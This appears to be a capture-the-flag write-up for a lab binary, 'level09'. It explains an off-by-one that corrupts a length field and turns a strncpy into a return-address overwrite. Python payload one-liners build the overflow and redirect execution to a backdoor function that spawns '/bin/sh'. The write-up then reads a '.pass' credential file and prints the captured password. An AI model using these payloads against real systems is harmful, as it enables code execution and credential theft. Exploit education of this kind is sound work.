## Level09

## Binary Analysis

`level09` contains a structured layout on the stack. A message buffer and a username buffer are part of a stack-allocated struct; an off-by-one write into the username buffer allows control of a length field, which is later used by `strncpy()` to copy user-controlled data into the message buffer. This combination leads to a powerful overflow that can overwrite the return address.

Structure (offsets):

- Message buffer: offset `0x00` - `0x8b` (140 bytes)
- Username buffer: offset `0x8c` - `0xb3` (40 bytes)
- Length field: offset `0xb4` - `0xb7` (4 bytes)

## Vulnerability Chain

1. `set_username` reads up to 128 bytes and copies into the username buffer with a loop `for (i = 0; i <= 0x28 && buffer[i] != 0; i++)` — the `<=` makes it copy 41 bytes instead of 40, so the 41st byte overflows into the first byte of the length field.
2. `set_msg` then reads up to 1024 bytes into a local buffer and calls `strncpy(struct+0x0, local_buffer, struct->len)`, where `struct->len` is the corrupted length field. If `len` is large, `strncpy` will copy far beyond the message buffer and can overwrite saved frame data, including the return address.

## Exploitation Steps

1. Overflow the length field by sending exactly 40 bytes for username followed by `\xff` (the 41st byte):

```bash
python -c "print 'A' * 40 + '\xff'" | ./level09
```

This sets the low byte of the length field to `0xff` (255), making `len` large.

2. Overflow the return address by supplying a message that is larger than 140 bytes. Based on the stack layout, the offset from the message buffer to the saved return address is 200 bytes (0xc0 + 8). Send `200` padding bytes followed by the target address (little-endian):

```bash
# Example: replace <TARGET_ADDR_BYTES> with the little-endian address of secret_backdoor
python -c "print 'A' * 200 + '<TARGET_ADDR_BYTES>'" | ./level09
```

3. The `secret_backdoor` function reads a line and calls `system()` on it. After redirecting execution there, send `/bin/sh` to spawn a shell.

Full exploit (conceptual):

```bash
(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'"; cat) | ./level09
```

Note: With PIE enabled the base address will vary — compute the full address by adding the module base to the `secret_backdoor` offset.

## Key Takeaways

- Off-by-one errors can be as dangerous as larger overflows.
- Corrupting length fields changes the behavior of otherwise-bounded copies (e.g., `strncpy`).
- PIE changes absolute addresses; compute them at runtime before crafting payloads.

## Result

After exploitation, retrieve the password:

```bash
cat /home/users/end/.pass
# j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
